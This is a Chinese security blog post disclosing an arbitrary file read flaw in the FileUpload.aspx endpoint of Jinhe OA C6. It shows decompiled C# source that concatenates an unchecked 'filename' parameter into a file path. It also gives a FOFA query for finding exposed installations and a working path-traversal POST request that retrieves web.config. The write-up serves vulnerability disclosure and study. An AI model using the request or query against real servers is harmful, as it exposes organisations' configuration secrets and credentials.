---
title: "金和OA FileUpload.aspx 文件读取漏洞"
source: https://mrxn.net/jswz/jhsoft-FileUpload-fileread.html
asset_dir: assets/金和oa-fileupload.aspx-文件读取漏洞
---

# 金和OA FileUpload.aspx 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/28 18:17
- 836浏览
- [0评论](#comment)
- 26分钟阅读

深入探索

网络安全培训

漏洞扫描服务

Docker加速服务

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `FileUpload.aspx` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者通过构造恶意请求访问该接口，传入任意文件路径参数，实现服务器上任意文件的读取，影响系统敏感数据的泄露和信息安全。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 FileUpload.aspx 的源码，在 bin 目录下查找 JHSoft.WCF.dll 将其进行反编译后找到 `FileUpload` 的处理逻辑

深入探索

物流软件安全

技术文章订阅

服务器安全服务

```
protected void Page_Load(object sender, EventArgs e)
{
  string str1 = this.Request["filename"] == null ? "" : this.Request["filename"].ToString();
  string str2 = string.Empty;
  if (string.op_Inequality(str1, ""))
  {
    DirectoryInfo parent = Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory.ToString());
    string _SrcFilePath = string.op_Equality(ConfigurationSettings.AppSettings["FilServer"], "") ? $"{parent.ToString().ToLower().Replace("\\c6", "")}\\Resource\\GovFiles\\{str1}" : $"{parent.ToString().ToLower().Replace("\\c6", "")}\\upload\\Resource\\GovFiles\\{str1}";
    string str3 = _SrcFilePath;
    str2 = new Upload().FindFilebyAbsolutePath(_SrcFilePath);
    if (string.op_Equality(str2, ""))
    {
      this.Response.Write("文件不存在,文件名：" + str1);
      this.Response.Write($"请在{str3}目录下查找");
      return;
    }
  }
  this.Response.Buffer = true;
  this.Response.ExpiresAbsolute = DateTime.Now.AddSeconds(-1.0);
  this.Response.Expires = 0;
  this.Response.CacheControl = "no-cache";
  FileStream fileStream = new FileStream(str2, (FileMode) 3);
  byte[] numArray = new byte[(int) ((Stream) fileStream).Length];
  ((Stream) fileStream).Read(numArray, 0, numArray.Length);
  ((Stream) fileStream).Close();
  if (numArray == null)
    return;
  try
  {
    this.Response.Clear();
    this.Response.ClearHeaders();
    this.Response.Buffer = true;
    this.Response.ContentType = "application/octet-stream";
    this.Response.AppendHeader("Content-Length", numArray.Length.ToString());
    if (this.Request.UserAgent.ToLower().IndexOf("firefox") > -1)
      this.Response.AddHeader("Content-Disposition", $"attachment;filename=\"{str1}\"");
    else
      this.Response.AppendHeader("Content-Disposition", "attachment;  filename=" + HttpUtility.UrlEncode(Encoding.UTF8.GetBytes(str1)));
    this.Response.BinaryWrite(numArray);
    this.Response.Flush();
    this.Response.End();
  }
  catch (Exception ex)
  {
  }
}
```

参数`filename`被直接拼接进`$"{parent.ToString().ToLower().Replace("\\c6", "")}\\upload\\Resource\\GovFiles\\{str1}";` 中，对参数没有任何过滤或校验，然后将路径使用`FileStream`进行文件操作并响应在body中，从而造成任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
POST /c6/JHSoft.WCF/FunctionNew/FileUpload.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

filename=../../../c6/web.config
```

[![金和OA FileUpload.aspx 文件读取漏洞](images/img-001-59031fd45aac.webp)](https://image.mrxn.net/c0db14dbc37b483685066cb9ecc6de23.webp)

可以成功读取到 `web.config` 的文件内容并回显。

安全工具开发

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
